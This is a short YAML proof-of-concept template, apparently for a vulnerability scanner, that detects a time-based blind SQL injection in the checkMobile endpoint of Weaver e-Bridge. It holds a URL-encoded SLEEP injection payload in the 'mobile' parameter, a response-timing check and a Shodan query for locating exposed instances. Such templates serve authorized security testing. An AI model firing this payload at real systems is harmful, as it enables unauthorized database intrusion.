id: poc-yaml-weaver-e-bridge-checkmobile-sqli
info:
  name: 泛微云桥 e-bridge checkMobile SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: weaver-ebridge
  shodan: app="泛微-云桥e-Bridge"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{.t1}}-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
  expression: 'status_code == 200 &&

    contains(body,"\"systemname\":") &&

    contains(body,"\"@URL\":") &&

    contains(content_type,"application/json") &&

    duration > t1 &&

    duration < t2

    '
transport: http
